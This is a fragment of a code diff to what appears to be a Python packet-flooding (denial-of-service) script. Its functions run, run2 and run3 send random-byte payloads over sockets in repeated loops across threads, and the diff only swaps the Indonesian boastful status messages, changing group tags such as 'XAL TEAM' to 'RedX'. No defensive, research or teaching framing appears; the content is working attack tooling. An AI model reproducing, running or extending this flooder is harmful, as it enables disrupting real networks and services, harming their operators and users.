@@ -35,7 +35,7 @@ def run():
 				s.sendto(data,addr)
 			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
 		except:
-			print("[X] AMPUN BANG!!!")
+			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def run2():
 	data = random._urandom(1025)
@@ -47,10 +47,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" XAL TEAM NIH BOSS!!!")
+			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
 		except:
 			s.close()
-			print("[X] AMPUN BANG")
+			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def run3():
 	data = random._urandom(16)
@@ -62,10 +62,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" XAL TEAM NIH BOSS!!!")
+			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
 		except:
 			s.close()
-			print("[X] AMPUN BANG")
+			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 for y in range(threads):
 	if choice == 'y':
